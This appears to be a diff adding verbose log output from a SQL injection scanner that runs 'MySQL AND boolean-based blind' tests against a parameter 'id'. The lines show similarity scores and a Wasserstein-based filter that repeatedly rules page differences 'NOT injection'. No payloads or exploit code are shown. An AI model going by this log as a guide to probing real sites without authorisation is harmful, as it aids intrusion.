+    [B-bool] [MySQL] 'id' req#225 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#226)
+    [B-bool] [MySQL] 'id' req#246 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#303)
+[*]    Wasserstein comparison probe (param='id' req#247)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#304)
+    [B-bool] [MySQL] 'id' req#227 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#228)
+    [B-bool] [MySQL] 'id' req#248 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#305)
+[*]    Wasserstein comparison probe (param='id' req#249)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#306)
+    [B-bool] [MySQL] 'id' req#229 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#230)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#307)
+    [B-bool] [MySQL] 'id' req#231 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#250 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#232)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#308)
+[*]    Wasserstein comparison probe (param='id' req#251)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#309)
+    [B-bool] [MySQL] 'id' req#233 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#234)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#310)
+    [B-bool] [MySQL] 'id' req#252 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#253)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#311)
+    [B-bool] [MySQL] 'id' req#235 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#236)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#312)
+    [B-bool] [MySQL] 'id' req#254 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#255)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#313)
+    [B-bool] [MySQL] 'id' req#237 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#238)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#314)
+    [B-bool] [MySQL] 'id' req#256 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#257)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#315)
+    [B-bool] [MySQL] 'id' req#239 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#240)
+    [B-bool] [MySQL] 'id' req#258 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#316)
+[*]    Wasserstein comparison probe (param='id' req#259)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#317)
+    [B-bool] [MySQL] 'id' req#260 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#261)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#318)
+    [B-bool] [MySQL] 'id' req#241 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#242)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#319)
+    [B-bool] [MySQL] 'id' req#262 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#243 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#263)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#320)
+[*]    Wasserstein comparison probe (param='id' req#244)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#321)
+    [B-bool] [MySQL] 'id' req#264 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#265)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#322)
+    [B-bool] [MySQL] 'id' req#245 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#246)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#323)
+    [B-bool] [MySQL] 'id' req#266 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#267)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#324)
+    [B-bool] [MySQL] 'id' req#268 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#247 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#269)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#325)
+    [B-bool] [MySQL] 'id' req#270 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#271)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#326)
+    [B-bool] [MySQL] 'id' req#272 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#248)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#327)
+    [B-bool] [MySQL] 'id' req#249 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#250)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#328)
+[*]    Wasserstein comparison probe (param='id' req#273)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#329)
+    [B-bool] [MySQL] 'id' req#251 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#252)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#330)
+    [B-bool] [MySQL] 'id' req#274 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#275)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#331)
+    [B-bool] [MySQL] 'id' req#253 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#254)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#332)
+    [B-bool] [MySQL] 'id' req#276 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#277)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#333)
+    [B-bool] [MySQL] 'id' req#255 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#256)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#334)
+    [B-bool] [MySQL] 'id' req#278 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#257 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#258)
+[*]   [Wasserstein] dist=0.6680 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6668 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#335)
+[*]    Wasserstein comparison probe (param='id' req#279)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#336)
+    [B-bool] [MySQL] 'id' req#259 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#260)
+[*]   [Wasserstein] dist=0.6675 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6668 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#337)
+    [B-bool] [MySQL] 'id' req#280 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#281)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#338)
+    [B-bool] [MySQL] 'id' req#261 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#262)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6660 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#339)
+    [B-bool] [MySQL] 'id' req#282 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#283)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#340)
+    [B-bool] [MySQL] 'id' req#284 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#263 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#264)
+[*]   [Wasserstein] dist=0.6663 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6660 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#341)
+[*]    Wasserstein comparison probe (param='id' req#285)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#342)
+    [B-bool] [MySQL] 'id' req#265 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#266)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#343)
+    [B-bool] [MySQL] 'id' req#286 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#287)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#344)
+    [B-bool] [MySQL] 'id' req#267 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#268)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#345)
+    [B-bool] [MySQL] 'id' req#288 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#289)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#346)
+    [B-bool] [MySQL] 'id' req#269 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#270)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#347)
+    [B-bool] [MySQL] 'id' req#290 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#291)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#348)
+    [B-bool] [MySQL] 'id' req#271 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#272)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#349)
+    [B-bool] [MySQL] 'id' req#292 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#293)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#350)
+    [B-bool] [MySQL] 'id' req#273 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#274)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#351)
+    [B-bool] [MySQL] 'id' req#294 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#275 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#276)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#352)
+[*]    Wasserstein comparison probe (param='id' req#295)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#353)
+    [B-bool] [MySQL] 'id' req#277 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#278)
+[*]   [Wasserstein] dist=0.6719 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6683 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#354)
+    [B-bool] [MySQL] 'id' req#279 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#280)
+[*]   [Wasserstein] dist=0.6711 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6683 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#355)
+    [B-bool] [MySQL] 'id' req#296 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#297)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#356)
+    [B-bool] [MySQL] 'id' req#281 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#282)
+[*]   [Wasserstein] dist=0.6661 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6661 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#357)
+    [B-bool] [MySQL] 'id' req#298 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#283 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#284)
+[*]   [Wasserstein] dist=0.6665 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6661 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#358)
+[*]    Wasserstein comparison probe (param='id' req#299)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#359)
+    [B-bool] [MySQL] 'id' req#285 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#286)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#360)
+    [B-bool] [MySQL] 'id' req#300 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#301)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#361)
+    [B-bool] [MySQL] 'id' req#287 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#302 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#303)
+[*]    Wasserstein comparison probe (param='id' req#288)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#362)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#363)
+    [B-bool] [MySQL] 'id' req#304 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#289 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#305)
+[*]    Wasserstein comparison probe (param='id' req#290)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#364)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#365)
+    [B-bool] [MySQL] 'id' req#306 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#291 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#307)
+[*]    Wasserstein comparison probe (param='id' req#292)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#366)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#367)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#368)
+    [B-bool] [MySQL] 'id' req#308 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#294 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#295)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#369)
+[*]    Wasserstein comparison probe (param='id' req#309)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#370)
+    [B-bool] [MySQL] 'id' req#296 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#297)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#371)
+    [B-bool] [MySQL] 'id' req#310 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#311)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#372)
+    [B-bool] [MySQL] 'id' req#298 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#299)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#373)
+    [B-bool] [MySQL] 'id' req#312 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#313)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#374)
+    [B-bool] [MySQL] 'id' req#300 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#301)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#375)
+    [B-bool] [MySQL] 'id' req#302 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#303)
+[*]   [Wasserstein] dist=0.6747 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6662 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+    [B-bool] [MySQL] 'id' req#314 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#315)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#376)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#377)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#378)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#379)
+    [B-bool] [MySQL] 'id' req#316 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#317)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#380)
+    [B-bool] [MySQL] 'id' req#306 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#307)
+[*]   [Wasserstein] dist=0.6701 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6701 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#381)
+    [B-bool] [MySQL] 'id' req#308 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#309)
+[*]   [Wasserstein] dist=0.6718 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6701 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#382)
+    [B-bool] [MySQL] 'id' req#310 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#311)
+[*]   [Wasserstein] dist=0.6728 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6701 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+    [B-bool] [MySQL] 'id' req#318 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#319)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#383)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#384)
+    [B-bool] [MySQL] 'id' req#312 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#313)
+[*]   [Wasserstein] dist=0.6707 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6701 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#385)
+    [B-bool] [MySQL] 'id' req#320 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#321)
+[*]   [Wasserstein] dist=0.6718 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6690 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#386)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#387)
+    [B-bool] [MySQL] 'id' req#322 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#323)
+[*]   [Wasserstein] dist=0.6696 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6690 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#388)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#389)
+    [B-bool] [MySQL] 'id' req#316 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#317)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#390)
+    [B-bool] [MySQL] 'id' req#318 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#324 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#325)
+[*]   [Wasserstein] dist=0.6726 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6696 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#391)
+[*]    Wasserstein comparison probe (param='id' req#319)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#392)
+    [B-bool] [MySQL] 'id' req#326 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#327)
+[*]   [Wasserstein] dist=0.6702 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6696 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#393)
+    [B-bool] [MySQL] 'id' req#328 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#329)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#394)
+    [B-bool] [MySQL] 'id' req#320 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#321)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#395)
+    [B-bool] [MySQL] 'id' req#330 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#331)
+[*]   [Wasserstein] dist=0.6679 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#396)
+    [B-bool] [MySQL] 'id' req#322 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#323)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#397)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#398)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#399)
+    [B-bool] [MySQL] 'id' req#326 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#332 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#333)
+[*]   [Wasserstein] dist=0.6661 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#400)
+[*]    Wasserstein comparison probe (param='id' req#327)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#401)
+    [B-bool] [MySQL] 'id' req#334 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#335)
+[*]   [Wasserstein] dist=0.6685 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#402)
+    [B-bool] [MySQL] 'id' req#328 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#329)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#403)
+    [B-bool] [MySQL] 'id' req#336 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#337)
+[*]   [Wasserstein] dist=0.6724 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#404)
+    [B-bool] [MySQL] 'id' req#330 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#331)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#405)
+    [B-bool] [MySQL] 'id' req#338 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#339)
+[*]   [Wasserstein] dist=0.6707 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6661 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#406)
+    [B-bool] [MySQL] 'id' req#332 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#333)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#407)
+    [B-bool] [MySQL] 'id' req#340 sim=0.641 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#341)
+[*]   [Wasserstein] dist=0.6749 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6661 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#408)
+    [B-bool] [MySQL] 'id' req#334 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#335)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#409)
+    [B-bool] [MySQL] 'id' req#342 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#343)
+[*]   [Wasserstein] dist=0.6724 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6685 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#410)
+    [B-bool] [MySQL] 'id' req#336 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#337)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#411)
+    [B-bool] [MySQL] 'id' req#344 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#345)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#412)
+    [B-bool] [MySQL] 'id' req#346 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#347)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#413)
+    [B-bool] [MySQL] 'id' req#338 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#339)
+[*]   [Wasserstein] dist=0.6681 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6660 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#414)
+    [B-bool] [MySQL] 'id' req#348 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#340 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#341)
+[*]   [Wasserstein] dist=0.6677 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6660 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#415)
+[*]    Wasserstein comparison probe (param='id' req#349)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#416)
+    [B-bool] [MySQL] 'id' req#342 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#350 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#343)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#417)
+[*]    Wasserstein comparison probe (param='id' req#351)
